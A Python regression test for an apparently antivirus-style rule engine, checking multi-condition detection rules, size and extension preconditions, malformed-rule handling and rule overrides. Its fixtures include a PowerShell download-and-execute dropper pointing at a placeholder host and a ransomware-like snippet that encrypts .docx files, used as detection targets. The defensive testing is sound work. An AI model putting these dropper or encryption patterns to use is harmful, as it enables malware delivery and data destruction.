# -*- coding: utf-8 -*-
"""JSON 规则引擎升级回归（v3.0.21）：all_of 多条件、size/ext 前置条件、坏规则容错、同 id 覆盖。

    python tools/test_rules_upgrade.py
"""
import json
import os
import shutil
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "app"))

import guard_core as g  # noqa: E402

P = F = 0


def ck(name, cond, extra=""):
    global P, F
    if cond:
        P += 1
        print(f"  ok   {name} {extra}")
    else:
        F += 1
        print(f"  FAIL {name} {extra}")


def write(path, text):
    with open(path, "w", encoding="utf-8") as f:
        f.write(text)


def main():
    tmp = tempfile.mkdtemp(prefix="whale_rule_")
    data = os.path.join(tmp, "data")
    os.makedirs(g.rules_dir(data), exist_ok=True)
    try:
        rules = g.load_rules(data)
        ids = {r["id"] for r in rules}
        ck("内置规则含两条多条件规则", {"AV-DROPPER", "AV-RANSOM-SCRIPT"} <= ids, f"共 {len(rules)} 条")

        print("[1] AV-DROPPER：三段齐全才命中")
        full = ("$u='http://x/a.exe'\nInvoke-WebRequest $u -OutFile \"$env:TEMP\\a.exe\"\n"
                "Start-Process \"$env:TEMP\\a.exe\"\n")
        p1 = os.path.join(tmp, "dropper.ps1")
        write(p1, full)
        hits = g.scan_file(p1, rules, data_dir=data)
        ck("三段齐全 → 命中", any(h.get("rule") == "AV-DROPPER" for h in hits),
           str([h.get("rule") for h in hits]))
        partial = "Invoke-WebRequest http://x/a.exe\nWrite-Host done\n"
        p2 = os.path.join(tmp, "partial.ps1")
        write(p2, partial)
        hits2 = g.scan_file(p2, rules, data_dir=data)
        ck("只有下载 → 不命中", not any(h.get("rule") == "AV-DROPPER" for h in hits2),
           str([h.get("rule") for h in hits2]))

        print("[2] AV-RANSOM-SCRIPT：遍历+文档后缀+加密")
        ransom = ("import os, glob\nfor f in glob.glob('*.docx'):\n"
                  "    data = open(f,'rb').read()\n    encrypt(data)\n")
        p3 = os.path.join(tmp, "r.ps1")
        write(p3, ransom)
        hits3 = g.scan_file(p3, rules, data_dir=data)
        ck("三条件 → 命中", any(h.get("rule") == "AV-RANSOM-SCRIPT" for h in hits3),
           str([h.get("rule") for h in hits3]))
        benign = "def encrypt(data):\n    return data\n"
        p4 = os.path.join(tmp, "b.ps1")
        write(p4, benign)
        hits4 = g.scan_file(p4, rules, data_dir=data)
        ck("只有 encrypt → 不命中", not any(h.get("rule") == "AV-RANSOM-SCRIPT" for h in hits4),
           str([h.get("rule") for h in hits4]))

        print("[3] size_gt 前置条件")
        write(os.path.join(g.rules_dir(data), "t.json"), json.dumps({"rules": [{
            "id": "T-SIZE", "name": "大文件才查", "kind": "regex", "scope": "file",
            "pattern": "PAYLOAD_MARK", "size_gt": 1000, "weight": 10}]}, ensure_ascii=False))
        small = os.path.join(tmp, "s1.ps1")
        write(small, "PAYLOAD_MARK")
        ck("小于阈值 → 不命中", not g.scan_file(small, g.load_rules(data), data_dir=data))
        big = os.path.join(tmp, "s2.ps1")
        write(big, "PAYLOAD_MARK" + "x" * 1200)
        ck("超过阈值 → 命中", bool(g.scan_file(big, g.load_rules(data), data_dir=data)))

        print("[4] ext 前置条件")
        write(os.path.join(g.rules_dir(data), "e.json"), json.dumps({"rules": [{
            "id": "T-EXT", "name": "只查 exe", "kind": "regex", "scope": "file",
            "pattern": "NEEDLE", "ext": [".exe"], "weight": 10}]}, ensure_ascii=False))
        a = os.path.join(tmp, "t.ps1")
        write(a, "NEEDLE")
        ck("扩展名不符 → 不命中", not g.scan_file(a, g.load_rules(data), data_dir=data))

        print("[5] 坏规则容错")
        write(os.path.join(g.rules_dir(data), "bad.json"),
              json.dumps({"rules": [
                  {"id": "BAD", "kind": "regex", "pattern": "[unclosed"},
                  {"id": "BAD2", "kind": "all_of", "patterns": ["[also unclosed"]}]},
                  ensure_ascii=False))
        rules2 = g.load_rules(data)
        ids2 = {r["id"] for r in rules2}
        ck("非法正则规则被跳过", "BAD" not in ids2 and "BAD2" not in ids2)
        ck("其余规则仍在", len(rules2) >= len(rules), f"{len(rules2)} 条")
        ck("加载不崩", True)

        print("[6] 同 id 覆盖内置")
        write(os.path.join(g.rules_dir(data), "ov.json"), json.dumps({"rules": [{
            "id": "H001", "name": "覆盖版", "kind": "regex", "scope": "cmdline",
            "pattern": "OVERWRITTEN", "weight": 5}]}, ensure_ascii=False))
        rules3 = g.load_rules(data)
        h1 = [r for r in rules3 if r["id"] == "H001"][0]
        ck("内置 H001 被覆盖", h1.get("name") == "覆盖版", h1.get("name"))
        write(os.path.join(tmp, "c.ps1"), "OVERWRITTEN")
        ck("覆盖后的规则生效", any(h.get("rule") == "H001"
                                for h in g.scan_file(os.path.join(tmp, "c.ps1"), rules3,
                                                     data_dir=data)))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    print(f"\n{P} passed, {F} failed")
    return 1 if F else 0


if __name__ == "__main__":
    sys.exit(main())
